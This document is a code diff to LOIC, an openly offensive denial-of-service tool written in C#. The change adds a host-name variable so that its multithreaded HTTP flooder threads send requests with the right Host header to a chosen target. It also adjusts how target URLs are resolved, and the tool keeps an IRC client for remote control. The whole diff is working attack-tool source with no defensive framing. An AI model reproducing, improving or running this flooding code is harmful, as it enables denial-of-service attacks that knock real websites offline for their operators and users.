@@ -17,7 +17,7 @@ namespace LOIC
 	{
 		private static XXPFlooder[] xxp;
 		private static HTTPFlooder[] http;
-		private static string sIP, sMethod, sData, sSubsite;
+		private static string sHost, sIP, sMethod, sData, sSubsite;
 		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
 		private static bool bResp, intShowStats;
 		private IrcClient irc;
@@ -58,6 +58,13 @@ namespace LOIC
                     sIP = txtTarget.Text;
                     if (String.IsNullOrEmpty(sIP) || String.Equals(sIP, "N O N E !"))
                         throw new Exception("Select a target.");
+
+                    if ( sHost.Length > 0 )
+                    {
+                        if (!sHost.Contains("://")) { sHost = "http://" + sHost; }
+                            sHost = new Uri(sHost).Host;
+                    }
+                    else { sHost = sIP; }
 
                     iProtocol = 0;
                     sMethod = cbMethod.Text;
@@ -101,7 +108,7 @@ namespace LOIC
                     http = new HTTPFlooder[iThreads];
                     for (int a = 0; a < http.Length; a++)
                     {
-                        http[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked);
+                        http[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked);
                         http[a].Start();
                     }
                 }
@@ -141,17 +148,17 @@ namespace LOIC
         }
         private void LockOnURL(bool silent)
         {
-            string url = txtTargetURL.Text.ToLower();
-            if (url.Length == 0)
+            sHost = txtTargetURL.Text.ToLower();
+            if (sHost.Length == 0)
             {
                 if (silent) return;
                 new frmWtf().Show();
                 MessageBox.Show("A URL is fine too...", "What the shit.");
                 return;
             }
-            if (url.StartsWith("https://")) url = url.Replace("https://", "http://");
-            else if (!url.StartsWith("http://")) url = String.Concat("http://", url);
-            try { txtTarget.Text = Dns.GetHostEntry(new Uri(url).Host).AddressList[0].ToString(); }
+            if (sHost.StartsWith("https://")) sHost = sHost.Replace("https://", "http://");
+            else if (!sHost.StartsWith("http://")) sHost = String.Concat("http://", sHost);
+            try { txtTarget.Text = Dns.GetHostEntry(new Uri(sHost).Host).AddressList[0].ToString(); }
             catch (Exception)
             {
                 if (silent) return;
@@ -606,7 +613,7 @@ namespace LOIC
 						int iaRequested = http[a].Requested;
 						int iaFailed = http[a].Failed;
 						http[a] = null;
-						http[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked);
+						http[a] = new HTTPFlooder(sHost, sIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked);
 						http[a].Downloaded = iaDownloaded;
 						http[a].Requested = iaRequested;
 						http[a].Failed = iaFailed;
